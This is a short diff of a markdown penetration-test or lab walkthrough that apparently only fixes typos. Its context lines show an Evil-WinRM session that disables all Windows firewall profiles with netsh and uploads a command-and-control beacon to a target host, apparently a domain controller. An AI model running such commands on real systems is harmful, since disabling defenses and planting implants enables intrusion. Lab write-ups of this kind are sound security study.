@@ -793,11 +793,11 @@ Its blocking outbound connections
 *Evil-WinRM* PS C:\Users\Public> netsh advfirewall set allprofiles state off
 Ok.
 ```
-The solution to this is to just disabled the firewall
+The solution to this is to just disable the firewall
 
 ![468](Pasted%20image%2020260419195027.png)
 
-Ive regenerated the beacon now ill put it on the target 
+Ive generated the beacon now ill put it on the target 
 
 ```python
 *Evil-WinRM* PS C:\Users\Public\downloads> upload dc1-main-agent.x64.exe
